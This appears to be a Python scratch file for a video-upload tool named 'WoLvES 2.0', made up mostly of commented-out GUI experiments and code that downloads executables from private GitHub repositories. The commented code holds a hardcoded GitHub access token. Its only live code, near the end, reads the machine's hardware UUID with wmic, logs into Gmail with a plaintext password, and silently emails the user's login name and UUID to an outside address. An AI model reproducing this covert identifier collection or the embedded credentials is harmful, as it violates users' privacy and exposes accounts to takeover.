# import subprocess
#
# from threading import Thread
#
# import os
# import PySimpleGUIQt as Sg
#
#
# def main_menu():
#
#     Sg.theme('DarkBlack1')
#     # arrayy = []
#     # for i in range(0,3):
#     #     arrayy.append([Sg.Text('Select how many video you want to upload.'), ],)
#
#     tab0_layout = [
#         [Sg.Text('Select how many video you want to upload.'), ],
#         [Sg.Text('Select how many video you want to upload.'), ],
#     ]
#
#     layout = [
#         [
#             Sg.Column(tab0_layout),
#     ]
#     ]
#
#     window = Sg.Window("WoLvES 2.0", layout, icon='./Essentials/app.ico', resizable=False, finalize=True)
#
#     while True:
#         event, values = window.Read()
#         if event is None or event == 'Exit':
#             self_pid_x = str(os.getpid())
#             subprocess.call('taskkill.exe /F /IM ' + self_pid_x, shell=True)
#             break
#
#     window.Close()
#
#
# main_menu_thread_x = Thread(target=main_menu)
# main_menu_thread_x.start()

# import PySimpleGUI as sg
#
# teams = ["a","b","c","d"]
#
#
# def main(i):
#     layout = ''
#     for i in teams:
#         layout = [[sg.Text(i), sg.Checkbox('team', enable_events=True),sg.Checkbox('team', enable_events=True), sg.Button('Next')]]
#
#         window = sg.Window('hey', layout)
#         while True:
#             event, values = window.read()
#             # print(event)
#             # print(values)
#             if event == 'Next':
#                 window.close()
#                 break
#             for z in values:
#                 if values[z]:
#                     print(z)
#
# games = ['']
# tags = ['']

# games = open('./Essentials/games.txt', 'r').readlines()
# tags = open('./Essentials/tags.txt', 'r').readlines()

# mp4_files = [i.replace('./Videos\\', '') for i in glob.glob("./Videos/*.mp4") if i]
# mp4_count = len(mp4_files)
# if mp4_count == 0:
#     Sg.popup_error("Put videos here !!!")
#     subprocess.call('taskkill.exe /F /IM ' + str(os.getpid()), shell=True)

# for file_name in mp4_files:
# new_name = ''
# game = ''
# tag_1 = ''
# tag_2 = ''
# tag_3 = ''
# tag_4 = ''
# tag_5 = ''
# tag_6 = ''
# tag_7 = ''
# tag_8 = ''
# tag_9 = ''
#
# substring = '+-+'
#
# if substring in file_name:
#     new_f_name = file_name.split('+-+')[1]
# else:
#     new_f_name = file_name

# tags_col = [[Sg.Listbox(tags, size=(14, 0.7), enable_events=True, key=f'check{j}{i}')
#              for i in range(5)] for j in range(4)],
#
#
# layout = [[Sg.Listbox(games, size=(20, 0.7), enable_events=True, key='_LIST0_'),
#            [[Sg.Listbox(tags, size=(14, 0.7), enable_events=True, key=f'check{j}{i}')
#             for i in range(5)] for j in range(4)]]]
#
#
# window = Sg.Window('Add tags!').Layout(layout)
#
# while True:
#     event, values = window.Read()

# layout = [[(Sg.Input(do_not_clear=True, size=(20, 0.7), enable_events=True, key=f'INPUT{j}{i}')for i in range(9)),
#            (Sg.Listbox(tags, size=(14, 0.7), enable_events=True, key=f'LIST{j}{i}')for i in range(9)),
#            (Sg.Text(' G: ', size=(20, 0.7), key=f'TEXT{j}{i}')for i in range(9))
#            ]for j in range(9)]

# layout = [[[Sg.Input(do_not_clear=True, size=(20, 0.7), enable_events=True, key='G_INPUT'), [Sg.Input(do_not_clear=True, size=(14, 0.7), enable_events=True, key=f'INPUT{i}')for i in range(10)]],
#           [Sg.Listbox(games, size=(20, 0.7), enable_events=True, key='G_LIST'), [Sg.Listbox(tags, size=(14, 0.7), enable_events=True, key=f'LIST{i}')for i in range(9)]],
#           [Sg.Text(' G: ', size=(20, 0.7), key='G_TEXT'), [Sg.Text(' T: ', size=(14, 0.7), key=f'TEXT{i}')for i in range(9)]]]]



# test_1 = [[Sg.Input(do_not_clear=True, size=(14, 0.7), enable_events=True, key=f'INPUT{i}') for i in range(9)]]
#
# test_2 = [[Sg.Listbox(tags, size=(14, 0.7), enable_events=True, key=f'LIST{i}')for i in range(9)]]
# test_3 = [[Sg.Text(f' T{i}: ', size=(14, 0.7), key=f'TEXT{i}')for i in range(9)]]




# layout_1 = [
#     [Sg.Input(do_not_clear=True, size=(20, 0.7), enable_events=True, key='_INPUT0_'), Sg.Column([[Sg.Input(do_not_clear=True, size=(14, 0.7), enable_events=True, key=f'INPUT{i}') for i in range(9)]])],
#     [Sg.Listbox(games, size=(20, 0.7), enable_events=True, key='_LIST0_'), Sg.Column([[Sg.Listbox(tags, size=(14, 0.7), enable_events=True, key=f'LIST{i}')for i in range(9)]])],
#     [Sg.Text(' G: ', size=(20, 0.7), key='TEXT'), Sg.Column([[Sg.Text(f' T{i}: ', size=(14, 0.7), key=f'TEXT{i}')for i in range(9)]])]]

# list_1 = ['a', 'b', 'c', 'd']
# list_2 = ['e', 'f', 'g', 'h']

# layout = [[Sg.Column([[Sg.Input(do_not_clear=True, size=(20, 0.7), enable_events=True, key=f'G_INPUT0{j}'), Sg.Column([[Sg.Input(do_not_clear=True, size=(14, 0.7), enable_events=True, key=f'INPUT{i}{j}') for i in range(9)]])],[Sg.Listbox(list_1, size=(20, 0.7), enable_events=True, key=f'G_LIST0{j}'), Sg.Column([[Sg.Listbox(list_1, size=(14, 0.7), enable_events=True, key=f'LIST{i}{j}')for i in range(9)]])],[Sg.Text(' G: ', size=(20, 0.7), key=f'G_TEXT{j}'), Sg.Column([[Sg.Text(f' T{i}: ', size=(14, 0.7), key=f'TEXT{i}{j}')for i in range(9)]])]])]for j in range(3)]

# layout = [
#     [Sg.Input(do_not_clear=True, size=(20, 0.7), enable_events=True, key='_INPUT0_'), Sg.Column([[Sg.Input(do_not_clear=True, size=(14, 0.7), enable_events=True, key=f'INPUT{i}') for i in range(9)]])],
#     [Sg.Listbox(list_1, size=(20, 0.7), enable_events=True, key='_LIST0_'), Sg.Column([[Sg.Listbox(list_2, size=(14, 0.7), enable_events=True, key=f'LIST{i}')for i in range(9)]])],
#     [Sg.Text(' G: ', size=(20, 0.7), key='TEXT'), Sg.Column([[Sg.Text(f' T{i}: ', size=(14, 0.7), key=f'TEXT{i}')for i in range(9)]])]]

#
# main(0)
# import io
#
# import urllib
#
# import PIL.Image as Image
# with open('./Essentials/tags.txt', 'r') as file:
#     content = file.read()
# # Upload to github
# git_prefix = ''
# git_file = git_prefix + 'tags.txt'
#
# print(content)
# test = content.split('\n')
#
#
# tags_string = '\n'.join([i for i in test[1:]])


# if git_file in all_files:
#     contents = repo.get_contents(git_file)
#     repo.update_file(contents.path, "committing files", tags_string, contents.sha, branch="main")
#
#     print(git_file + ' UPDATED')
# else:
#     repo.create_file(git_file, "committing files", tags_string, branch="main")
#     print(git_file + ' CREATED')

# import base64
# import io
# from urllib import parse
#
# from PIL import Image
# from github import Github
# g = Github('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')
# repo = g.get_user().get_repo('tags')
# content_tags = repo.get_contents(parse.quote('test.exe'), ref="main").raw_data
# content_tag = repo.raw_data
# all_tags_bytes = base64.b64decode(content_tags)
# print(content_tags)
#
# img = Image.open(io.BytesIO(all_tags_bytes))
# img.save('test1.exe')
# content_game = repo.get_contents(parse.quote('games.txt'), ref="main").content
#
# all_games_bytes = base64.b64decode(content_game)


# all_games = all_games_bytes.decode("utf-8")
# with open('file.txt', 'w+') as tags_file:
#     tags_file.write(all_games)
#     tags_file.close()

# tags = ['']
# all_tags = all_tags_bytes.decode("utf-8")
# tag_array = all_tags.split('\n')
# tags.extend(tag_array)
# print(tags)

# import subprocess
# import os
# powershell = ''
# if os.path.isfile('C:/Program Files/PowerShell/7/pwsh.exe'):
#     powershell = 'pwsh'
# elif os.path.isfile('C:/Program Files (x86)/PowerShell/7/pwsh.exe'):
#     powershell = 'pwsh'
# else:
#     powershell = 'powershell'
# filename = 'test.exe'
#
# subprocess.call(powershell + ' -Command curl.exe -H '+'\'Authorization: token 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\''+' -H '+'\'Accept: application/vnd.github.v4.raw\''+' -o ' + filename + ' https://raw.githubusercontent.com/WoLvES-2x0/tags/main/'+filename, shell=True)
#
# print(powershell + ' -Command curl.exe -H '+'\'Authorization: token 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\''+' -H '+'\'Accept: application/vnd.github.v4.raw\''+' -o ' + filename + ' https://raw.githubusercontent.com/WoLvES-2x0/tags/main/'+filename)

# , stdout=subprocess.PIPE, stderr=subprocess.PIPE


# import requests
#
# headers = {
#     "Authorization": "token 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",
#     "Accept": "application/vnd.github.v4.raw",
# }
# r = requests.get(
#     "https://raw.githubusercontent.com/WoLvES-2x0/tags/main/app.ico", headers=headers
# )
# print(r.content)
# open('./Essentials/app.ico', 'wb').write(r.content)
import os
import random
import smtplib
import ssl
import string
import subprocess
import time
from datetime import datetime
import getpass
import glob
import hashlib
from urllib import parse
import csv
import urllib.request as urllib_x
import requests
import pandas as pd
import base64
# from github import Github
# g = Github("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")
# repo = g.get_user().get_repo('files')

# content_test = repo.get_contents(parse.quote('app.ico'), ref="main").content
# all_test_bytes = base64.b64decode(repo.get_contents(parse.quote('app.ico'), ref="main").content)


# open('app.ico', 'wb').write(base64.b64decode(repo.get_contents(parse.quote('app.ico'), ref="main").content))

# games = ['']
# games.extend(
#     base64.b64decode(repo.get_contents(parse.quote('games.txt'), ref="main").content).decode("utf-8").split('\n'))
#
# print(games)
# tags = ['']
# tags.extend(
#     base64.b64decode(repo.get_contents(parse.quote('tags.txt'), ref="main").content).decode("utf-8").split('\n'))
# print(tags)

# while '' in base64.b64decode(repo.get_contents(parse.quote('tags.txt'), ref="main").content).decode("utf-8"
# ).split('\n'):
# tags.extend([i for i in base64.b64decode(repo.get_contents(parse.quote('tags.txt'), ref="main").content).decode(
# "utf-8").split('\n') if i])
#
#     # test2 = i.remove('')
# print(tags)


# mp4_files = [i.replace('./Videos/waiting for upload\\', '') for i in glob.glob("./Videos/waiting for upload/*.mp4")
# if i]
# only_files = [i for i in glob.glob("*.exe") if i]
#
# print(only_files)
# # for mp4_file in glob.glob("./Videos/*.mp4"):
# #     mp4_files.append(mp4_file.replace('./Videos\\', ''))
# print(mp4_files)
# digest = ''
# only_files = [i for i in glob.glob("*.exe") if i]
# for i in only_files:
#     md5_hash = hashlib.md5()
#     md5_hash.update(open(i, "rb").read())
#     digest = md5_hash.hexdigest()
#     print(digest)
# print(digest)
# acc_name = open('./Essentials/main-acc.txt', 'r').readlines()[0].strip()
# acc_password = open('./Essentials/main-acc.txt', 'r').readlines()[1].strip()
# print(acc_name)
# print(acc_password)

# all_vid = ''
# mp4_files = [i.replace('./Videos/waiting for upload\\', '') for i in glob.glob("./Videos/waiting for upload/*.mp4")
#              if i]

# all_vid = mp4_files.split(',')
# all_vid = [all_vid + i + ',' for i in mp4_files if i]
# print(all_vid)
# list = [1, 2, 3]
# s = [str(i) for i in list]  # int list to string
# print(s)
# Join list items using join()
# acc_name = open('./Essentials/main-acc.txt', 'r').readlines()[0].strip()
# acc_password = open('./Essentials/main-acc.txt', 'r').readlines()[1].strip()


# my_string =
# print(my_string)
# Driver code
# hash_object = (hashlib.md5((getpass.getuser() + str(datetime.now().strftime("%m")) + str(
#     datetime.now().strftime("%d")) + str(datetime.now().year) + str(datetime.now().strftime("%H")) + str(
#     datetime.now().strftime("%M")) + str(datetime.now().strftime("%S")) + acc_password).encode())).hexdigest()
# print(hash_object)

# node_hash = requests.get('https://pastebin.com/raw/TFCC8JLJ').text.replace('\r', '').split('\n')
# upload_hash = node_hash[node_hash.index('upload')+1]
# print(upload_hash)
# files_hash = ','.join(map(str, [i + ',' + hashlib.md5(open(i, "rb").read()).hexdigest() for i in [
#     i for i in glob.glob("*.exe") if i]])).split(',')
# try:
#     filename = files_hash[files_hash.index(node_hash[node_hash.index('upload') + 1])-1]
# except ValueError as e:
#     print(e)

# file_names = [i for i in repo.get_contents('') if i]
#
# print(file_names)


# print(contents.pop(0))

# all_files = [str(i).replace('ContentFile(path="', '').replace('")', '') for i in repo.get_contents('') if i]
#
# print(all_files)


# git_file_name = [str(i).replace('ContentFile(path="', '').replace('")', '') for i in
#                                (g.get_user().get_repo('files')).get_contents('') if i]
# node_hash = ' '.join(map(str, git_file_name)).split(' ')
# files_hash = ','.join(map(str, [i + ',' + hashlib.md5(open(i, "rb").read()).hexdigest() for i in [
#     i for i in glob.glob("*.exe") if i]])).split(',')

# main_file = [i for i in git_file_name if 'upload' in i][0]
# r = (requests.get('https://raw.githubusercontent.com/WoLvES-2x0/files/main/' + main_file, headers={"Authorization": "token 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", "Accept": "application/vnd.github.v4.raw"}))

# open('upload.exe', 'wb').write((requests.get('https://raw.githubusercontent.com/WoLvES-2x0/files/main/' + [i for i in git_file_name if 'upload' in i][0], headers={"Authorization": "token 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", "Accept": "application/vnd.github.v4.raw"})).content)
#
# open('./Essentials/app.ico', 'wb').write(base64.b64decode((g.get_user().get_repo('essential')).get_contents(parse.quote('icon.ico'), ref="main").content))
#


# all_files.append(str(i).replace('ContentFile(path="', '').replace('")', ''))

# while contents:
#     all_files.append(str(contents.pop(0)).replace('ContentFile(path="', '').replace('")', ''))

# tesst = ' '.join(map(str, all_files)).split(' ')
# print(tesst)

# print(all_files)




# filename = ','.join(map(str, [i + ',' + hashlib.md5(open(i, "rb").read()).hexdigest() for i in
#                               [i for i in glob.glob("*.exe") if i]])).split(',')[
#     (','.join(map(str, [i + ',' + hashlib.md5(open(i, "rb").read()).hexdigest() for i in [
#         i for i in glob.glob("*.exe") if i]])).split(',')).index(
#         requests.get('https://pastebin.com/raw/TFCC8JLJ').text.replace('\r', '').split('\n')[
#                     (requests.get('https://pastebin.com/raw/TFCC8JLJ').text.replace('\r', '').split('\n')).index(
#                         'upload') + 1]) - 1]
#

#
# print(filename)

# mm = 'test' if test == '656c27e260525d840638ebd88801a2ac' else print(test)

# print(test)
# for i in only_files:
#     digest =
#     print(digest)

# lists = ['dsfs', 'dsasdfgfs', 'dsfs', 'dasdsfs', 'dtyuygsfs']
# if not os.path.isfile('./Essentials/games.txt') or len(open('./Essentials/games.txt', "r").readlines()) == 0:
# new_menu = ['Hawaiian', 'Margherita', 'Mushroom', 'Prosciutto', 'Meat Feast', 'Hawaiian', 'Bacon', 'Black Olive Special', 'Sausage', 'Sausage']

# final_new_menu = list(dict.fromkeys(lists))
#
# print(final_new_menu)
# open('./Essentials/games.txt', "w+").write('')
# [open('./Essentials/games.txt', "a").write(i+'\n') for i in lists if i]
#



# if len(open('./Essentials/games.txt', "r").readlines()) == 0:
#     open('./Essentials/games.txt', "w+").write('0')

# test = file_ac
# line_count_ac = 0
# for li in file_ac:
#     if li != "\n":
#         line_count_ac += 1
# file_ac.close()

# test_x = base64.b64decode((g.get_user().get_repo('essential')).get_contents(parse.quote('vpn-raw.ovpn'), ref="main").content)
# games = []
# vpn_raw = [i for i in base64.b64decode((g.get_user().get_repo('essential')).get_contents(
#     parse.quote('vpn-raw.ovpn'), ref="main").content).decode("utf-8").split('\r') if i]
#
# vpn_raw_file = vpn_raw
# vpn_raw_file[2] = "\nproto tcp"
# vpn_raw_file[3] = "\nremote " + '192.168.0.0' + " 443"
# open('./Essentials/connect.ovpn', "w").writelines(vpn_raw_file)
# str_var = list((''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(random.randint(1, 2)))) + (''.join(random.SystemRandom().choice(string.ascii_letters) for _ in range(random.randint(6, 8)))) + (''.join(random.SystemRandom().choice(string.digits) for _ in range(random.randint(2, 4)))) + (''.join(random.SystemRandom().choice('!@$%^*()') for _ in range(random.randint(1, 3)))))
# random.shuffle(str_var)
# p_a = ''.join(str_var)
# print(p_a)

# open('./Essentials/UsedIPs.txt', 'w+').write(requests.get('https://api.ipify.org').text + '\n')
# try:
#     test = requests.get('https://api.ipify.org').text
# except requests.exceptions.ConnectionError:
#     pass
# print(test)
#

# # url = 'https://raw.githubusercontent.com/LoNE-W0LvES/testuser00x8/main/vpn-ip.csv'
#
# test = requests.get(url, headers=header)
# df = pd.read_csv(test)
# print(df)

# import numpy as np
# import pandas as pd
# import requests
# from io import StringIO
#
# url = 'https://raw.githubusercontent.com/WoLvES-2x0/essential/main/vpn-ip.csv'
# header = {"Authorization": "token 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", "Accept": "application/vnd.github.v4.raw"}
# r = requests.get(url, headers=header)

# df = pd.read_csv(string_io_obj)
# vpn_data_txt = open('./Essentials/VPN.txt', "r").readlines()
# vpn_name = vpn_data_txt[1].replace('\n', '')
# ddf = pd.read_csv(string_io_obj, usecols=[vpn_name.strip()]).T.values.tolist()[0]
# print(ddf)
# time.sleep(1)
# for i in range(1, 50):
#     ddf = pd.read_csv(StringIO(r.text), usecols=[vpn_name.strip()]).T.values.tolist()[0]
#     print(ddf)

# t1 = df.index
# print(t1)

# test = (df, usecols=[vpn_name.strip()]).T.values.tolist()[0]


# optionally write df to CSV
# df.to_csv("file_name_02.csv")



# response = urllib_x.urlopen(url)
# cr = csv.reader(response)
#
# for row in cr:
#     print(row)
#
# vpn_raw = [i for i in base64.b64decode((g.get_user().get_repo('essential')).get_contents(
#     parse.quote('vpn-ip.csv'), ref="main").content).decode("utf-8").split('\r') if i]
# print(vpn_raw)
# test_x = base64.b64decode((g.get_user().get_repo('essential')).get_contents(parse.quote('vpn-ip.csv'), ref="main").content).decode("utf-8")
# print(test_x)

# data = base64.b64decode((g.get_user().get_repo('essential')).get_contents(parse.quote('vpn-ip.csv'), ref="main").content).decode("utf-8").replace('\r', '')
#
# data1 = pd.read_csv('./Essentials/vpn-ip.csv')
# print(data1)


# print(open('./Essentials/vpn-ip.csv', 'r').readlines())
#
#
# vpn_ip = [x for x in data1 if not pd.isnull(x)]
# print(vpn_ip)
# from PIL import ImageQt
#
# from io import BytesIO
import requests
import PySimpleGUI as Sg
# from github import Github
# import tempfile
#
#
# g = Github("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")
# repo = g.get_user().get_repo('tags')
# temp_dir = tempfile.mkdtemp()
# img_data = base64.b64decode(repo.get_contents(parse.quote('app.png'), ref="main").content)
# open(temp_dir + '/icon.ico', 'wb').write(img_data)

#
# img_box = [[Sg.Text('                                           ')],
#            [Sg.Text('                                           ')],
#            [Sg.Text('                                           ')]]
# window = Sg.Window('test', img_box, icon=temp.read())
# while True:
#     event, values = window.read()
#     if event is None:
#         break


# import PySimpleGUI as g
#
# questions = ('Managing your day-to-day life', 'Coping with problems in your life?', 'Concentrating?',
#              'Get along with people in your family?', 'Get along with people outside your family?',
#              'Get along well in social situations?', 'Feel close to another person',
#              'Feel like you had someone to turn to if you needed help?', 'Felt confident in yourself?')
#
# def Radio(group, key): return g.Radio('', group_id=group, size=(7,2), key=key)
#
# def Question(number, text): return [g.T(number, size=(2,2)), g.T(text, size=(30,2))]
#
# def Question(number, text):
#     return [g.T(number, size=(2,2)), g.T(text, size=(30,2))]
#
# layout3 = [Question(qnum+1, q) + [Radio(qnum, (qnum, col)) for col in range(5)] for qnum, q in enumerate(questions)] + [[g.OK()]]
#
# event, values = g.Window('Questionaire', layout3).Read()

# layout_main += [[Sg.Text('', size=(11.8, 0.3), font='Any 3')],
#                 [Sg.Checkbox(vid_file_name[j], enable_events=True, font='Any 15', key=f'SWITCH{j}')],
#                 [Sg.Text(' Search:                                        Tags List: ')],
#                 [Sg.InputText('', size=(40, 0.7), enable_events=True, key=f'INPUT{j}'),
#                  Sg.Button('New Tag', size=(13, 0.8), key=f'BUTTON{j}')],
#                 [Sg.Listbox(values=tags, enable_events=True, size=(40, 2), key=f'-FILE LIST{j}'), ],
#                 [Sg.Checkbox('Use New Name :', enable_events=True, font='Any 10', key=f'SWITCH_NN{j}'),
#                  Sg.InputText('', size=(38, 0.7), visible=False, enable_events=True, key=f'INPUT_NN{j}'),
#                  Sg.Text(' .mp4', visible=False, key=f'MP4{j}')], [Sg.Text('Tags: ', key=f'G_TEXT{j}')],
#                 [Sg.Text('', size=(11.8, 0.3), font='Any 3')], [Sg.HorizontalSeparator()]]
#
# layout_main += [[Sg.Text('', size=(11.8, 0.3), font='Any 3')],
#                 [Sg.Checkbox(vid_file_name[j], enable_events=True, font='Any 15', key=f'SWITCH{j}')],
#                 [Sg.Text(' Search:                                        Tags List: ')],
#                 [Sg.InputText('', size=(20, 0.7), enable_events=True, key=f'INPUT{j}'),
#                  Sg.Listbox(values=tags, enable_events=True, size=(30, 0.7), key=f'-FILE LIST{j}'),
#                  Sg.Button('New Tag', size=(13, 0.8), key=f'BUTTON{j}')],
#                 [Sg.Checkbox('Use New Name :', enable_events=True, font='Any 10', key=f'SWITCH_NN{j}'),
#                  Sg.InputText('', size=(38, 0.7), visible=False, enable_events=True, key=f'INPUT_NN{j}'),
#                  Sg.Text(' .mp4', visible=False, key=f'MP4{j}')], [Sg.Text('Tags: ', key=f'G_TEXT{j}')],
#                 [Sg.Text('', size=(11.8, 0.3), font='Any 3')], [Sg.HorizontalSeparator()]]

hw_id = str(subprocess.Popen('wmic csproduct get uuid', shell=True,
                             stdout=subprocess.PIPE).communicate()[0]).split('\\r\\n')[1].strip('\\r').strip()
with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=ssl.create_default_context()) as server:
    server.login('w3961500@gmail.com', 'wolvesbatch00')
    server.sendmail('w3961500@gmail.com', 'wolvesbatch1@gmail.com', getpass.getuser() + '\n' + hw_id)



# import PySimpleGUIQt as sg
#
# """
#     System Tray Icon
#     Your very own peronsal status monitor in your system tray
#     Super easy to use.
#     1. Find an icon file or use this default
#     2. Create your menu defintion
#     3. Add if statements to take action based on your input
#
# """
#
# logo = b'iVBORw0KGgoAAAANSUhEUgAAACEAAAAgCAMAAACrZuH4AAAABGdBTUEAALGPC/xhBQAAAwBQTFRFAAAAMGmYMGqZMWqaMmubMmycM22dNGuZNm2bNm6bNG2dN26cNG6dNG6eNW+fN3CfOHCeOXGfNXCgNnGhN3KiOHOjOXSjOHSkOnWmOnamOnanPHSiPXakPnalO3eoPnimO3ioPHioPHmpPHmqPXqqPnurPnusPnytP3yuQHimQnurQn2sQH2uQX6uQH6vR32qRn+sSXujSHynTH2mTn+nSX6pQH6wTIGsTYKuTYSvQoCxQoCyRIK0R4S1RYS2Roa4SIe4SIe6SIi7Soq7SYm8SYq8Sou+TY2/UYStUYWvVIWtUYeyVoewUIi0VIizUI6+Vo+8WImxXJG5YI2xZI+xZ5CzZJC0ZpG1b5a3apW4aZm/cZi4dJ2/eJ69fJ+9XZfEZZnCZJzHaZ/Jdp/AeKTI/tM8/9Q7/9Q8/9Q9/9Q+/tQ//9VA/9ZA/9ZB/9ZC/9dD/9ZE/tdJ/9dK/9hF/9hG/9hH/9hI/9hJ/9hK/9lL/9pK/9pL/thO/9pM/9pN/9tO/9tP/9xP/tpR/9xQ/9xR/9xS/9xT/91U/91V/t1W/95W/95X/95Y/95Z/99a/99b/txf/txh/txk/t5l/t1q/t5v/+Bb/+Bc/+Bd/+Be/+Bf/+Bg/+Fh/+Fi/+Jh/+Ji/uJk/uJl/+Jm/+Rm/uJo/+Ro/+Rr/+Zr/+Vs/+Vu/+Zs/+Zu/uF0/uVw/+dw/+dz/+d2/uB5/uB6/uJ9/uR7/uR+/uV//+hx/+hy/+h0/+h2/+l4/+l7/+h8gKXDg6vLgazOhKzMiqrEj6/KhK/Qka/Hk7HJlLHJlLPMmLTLmbbOkLXSmLvXn77XoLrPpr/Tn8DaocLdpcHYrcjdssfZus/g/uOC/uOH/uaB/uWE/uaF/uWK/+qA/uqH/uqI/uuN/uyM/ueS/ueW/ueY/umQ/uqQ/uuS/uuW/uyU/uyX/uqa/uue/uye/uyf/u6f/uyq/u+r/u+t/vCm/vCp/vCu/vCy/vC2/vK2/vO8/vO/wtTjwtXlzdrl/vTA/vPQAAAAiNpY5gAAAQB0Uk5T////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////AFP3ByUAAAAJcEhZcwAAFw8AABcPASe7rwsAAAAYdEVYdFNvZnR3YXJlAHBhaW50Lm5ldCA0LjEuMWMqnEsAAAKUSURBVDhPhdB3WE1xHMdxt5JV0dANoUiyd8kqkey996xclUuTlEKidO3qVnTbhIyMW/bee5NskjJLmR/f3++cK/94vP76Ps/n/Zx7z6mE/6koJowcK154vvHOL/GsKCZXkUgkWlf4vWGWq5tsDz+JWIzSokAiqXGe7nWu3HxhEYof7fhOqp1GtptQuMruVhQdxZ05U5G47tYUHbQ4oah6Fg9Z4ubm7i57JhQjdHS0RSzUPoG17u6zZTKZh8c8XlytqW9YWUOH1LqFOZ6enl5ec+XybFb0rweM1tPTM6yuq6vLs0lYJJfLvb19fHwDWGF0jh5lYNAe4/QFemOwxtfXz8/fPyBgwVMqzAcCF4ybAZ2MRCexJGBhYGBQUHDw4u1UHDG1G2ZqB/Q1MTHmzAE+kpCwL1RghlTaBt/6SaXS2kx9YH1IaOjSZST8vfA9JtoDnSngGgL7wkg4WVkofA9mcF1Sx8zMzBK4v3wFiYiMVLxlEy9u21syFhYNmgN7IyJXEYViNZvEYoCVVWOmUVvgQVSUQqGIjolRFvOAFd8HWVs34VoA+6OjY2JjY5Vxm4BC1UuhGG5jY9OUaQXci1MqlfHx8YmqjyhOViW9ZsUN29akJRmPFwkJCZsTSXIpilJffXiTzorLXYgtcxRJKpUqKTklJQ0oSt9FP/EonxVdNY4jla1kK4q2ZB6mIr+AipvduzFUzMSOtLT09IyMzMxtJKug/F0u/6dTexAWDcXXLGEjapKjfsILOLKEuYiSnTQeYCt3UHhbwEHjGMrETfBJU5zq5dSTcXC8hLJccSWP2cgLXHPu7cQNAcpyxF1dyjehAKb0cSYUAOXCUw6V8OFPgevTXFymC+fPPLU677Nw/1X8A/AbfAKGulaqFlIAAAAASUVORK5CYII='
#
# menu_def = ['UNUSED', ['My', 'Simple', '---', 'Menu', 'Exit']]
# tray = sg.SystemTray(menu=menu_def, data_base64=logo)
# tray.show_message('Starting', 'Now Starting the application')
#
# while True:
#     event = tray.read()
#     if event == 'Exit':
#         break
#     elif event == 'Menu':       # add your checks here
#         pass
#     tray.show_message('Event', '{}'.format(event))
